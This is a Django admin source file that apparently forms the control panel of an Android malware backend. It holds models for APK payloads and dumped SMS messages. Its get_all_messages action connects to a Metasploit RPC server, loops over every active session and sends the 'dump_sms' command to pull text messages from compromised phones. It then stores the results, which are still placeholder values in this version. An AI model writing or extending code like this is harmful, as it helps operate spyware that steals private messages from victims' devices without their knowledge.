from django.contrib import admin
from back.models import Messages, apkPayload, dump_sms

# Register your models here.


class MessagesAdmin(admin.ModelAdmin):
    list_display = ("date", "ip", "message")
    list_filter = ("date", "ip")
    search_fields = ("message", "ip", "date")
    actions = ["start_socket"]


class apkPayloadAdmin(admin.ModelAdmin):
    list_display = ("apk_name", "download", "port")
    list_filter = ("apk_name", "port")
    search_fields = ("apk_name", "port")


from pymetasploit3.msfrpc import MsfRpcClient


class dump_smsAdmin(admin.ModelAdmin):
    list_display = ("sms_type", "phone_number", "date", "status", "body")
    list_filter = ("sms_type", "phone_number", "date", "status", "body")
    search_fields = ("sms_type", "phone_number", "date", "status", "body")
    actions = ["print_hello_world", "get_all_messages"]

    def print_hello_world(self, request, queryset):
        print("Hello World")

    def get_all_messages(self, request, queryset):
        print("starting")

        # ejecutar el comando
        client = MsfRpcClient("securepassword", ssl=True)
        for i in client.sessions.list().keys():
            shell = client.sessions.session(i)
            shell.write("dump_sms")
            shell.read()

        # Messages.objects.create(ip=self.client_address[0], message=self.request.recv(1024).decode())

        dump_sms.objects.create(sms_type="test", phone_number="test1", date="2022-06-15", status="test3", body="test4")


admin.site.register(Messages, MessagesAdmin)
admin.site.register(apkPayload, apkPayloadAdmin)
admin.site.register(dump_sms, dump_smsAdmin)
